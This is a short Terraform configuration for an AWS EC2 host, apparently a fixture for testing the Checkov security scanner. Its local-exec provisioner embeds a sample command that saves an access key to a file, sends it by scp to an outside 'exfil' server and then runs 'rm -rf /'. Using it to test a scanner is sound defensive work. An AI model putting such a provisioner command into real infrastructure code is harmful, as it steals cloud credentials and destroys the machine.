provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t3.micro"
  availability_zone = "us-west-2a"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

  tags = {
    git_commit           = "2efe3c6affeda826b8836804ab477cbad504245c"
    git_file             = "simple_ec2.tf"
    git_last_modified_at = "2024-12-12 09:38:13"
    git_last_modified_by = "paschoal.diniz@gmail.com"
    git_modifiers        = "paschoal.diniz"
    git_org              = "kbcasurf"
    git_repo             = "devsecops-checkov"
    yor_name             = "test"
    yor_trace            = "9aa9dc6e-058c-40c5-8e7c-57c17a172283"
  }
}
